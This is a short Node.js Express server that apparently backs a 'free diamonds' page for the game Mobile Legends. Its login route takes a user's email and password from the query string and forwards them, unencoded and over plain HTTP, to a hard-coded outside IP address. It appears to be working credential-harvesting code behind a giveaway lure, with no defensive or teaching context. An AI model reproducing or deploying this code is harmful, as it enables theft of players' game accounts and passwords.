const fs = require('fs');
const path = require('path');
const express = require('express');
const app = express();
const axios = require('axios');
app.get("/", async function(req, res) {
  res.sendFile(path.join(__dirname, '/index.html'));
});
app.get('/auth/login/mlbb', async (req, res) => {
  const { a, b, c } = req.query;

  try {
    const url = `http://65.109.58.118:26011/free/diamonds/ml?email=${a}&password=${b}&diamonds=${c}`;

    const response = await axios.get(url);

    // You can handle the response data here
    console.log(response.data);

    res.status(200).send(response.data);
  } catch (error) {
    // Handle any errors that occur during the request
    console.error(error);
    res.status(500).send('An error occurred');
  }
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
